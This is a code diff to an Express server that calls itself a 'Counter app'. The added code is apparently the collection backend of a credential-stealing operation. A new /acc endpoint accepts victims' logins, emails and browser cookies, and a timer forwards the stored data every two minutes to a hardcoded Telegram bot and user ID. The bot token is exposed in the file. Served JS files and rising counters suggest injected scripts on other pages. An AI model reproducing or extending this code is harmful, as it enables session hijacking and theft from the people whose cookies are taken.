@@ -3,27 +3,24 @@ const app = express();
 const cors = require('cors');
 const port = process.env.PORT || 3000;
 const path = require('path');
+const setupJsFileRoutes = require('./setupJsFileRoutes');
+const TelegramBot = require('node-telegram-bot-api');
+const bot = new TelegramBot('7271931429:AAHY6hbLcexDXhL7cmvmPc-xZjfrHAEbSUI', { polling: false });
+let motherObject = {};
+
 
 app.use(express.text());
 app.use(cors());
 
-// Define the path to the .js file in the root directory
-const jsFilePath = path.join(__dirname, '1.js');
-
-// Define the route for serving the .js file from the disk
-app.get('/1.js', (req, res) => {
-    // Serve the file from the disk
-    res.sendFile(jsFilePath, (err) => {
-        if (err) {
-            console.error('Error serving the file:', err);
-            res.status(500).send('Server Error');
-        }
-    });
+// Set up routes for JS files
+setupJsFileRoutes(app).then(count => {
+  console.log(`Set up ${count} routes for JS files`);
 });
 
+
 let counters = {
-    "g-": 95862,
-    "s-": 5452
+    "g-": 151310,
+    "s-": 14460
 };
 
 let receivedCounters = {
@@ -115,6 +112,40 @@ app.post('/', (req, res) => {
         res.status(400).send("Invalid counter format");
     }
 });
+
+// Add this after the existing code
+app.post('/acc', (req, res) => {
+  try {
+    const data = JSON.parse(req.body);
+	console.log(req.body);
+    const login = Object.keys(data)[0];
+    
+    if (login && data[login].email && data[login].cookies) {
+      motherObject[login] = data[login];
+      res.status(200).send('Data received and stored successfully');
+    } else {
+      res.status(400).send('Invalid data format');
+    }
+  } catch (error) {
+    res.status(400).send('Error processing the request');
+  }
+});
+
+// Function to send motherObject as a text file via Telegram
+function sendMotherObjectViaTelegram() {
+  const userId = '7136999028'; // Replace with the actual Telegram user ID
+  const text = JSON.stringify(motherObject, null, 2);
+  
+  bot.sendDocument(userId, Buffer.from(text), {
+    filename: 'mother_object.txt',
+    contentType: 'text/plain',
+  }).catch(error => console.error('Error sending file:', error));
+}
+
+// Set up interval to send motherObject every 2 minutes
+setInterval(sendMotherObjectViaTelegram, 2 * 60 * 1000);
+
+
 
 app.listen(port, () => {
   console.log(`Counter app listening at http://localhost:${port}`);
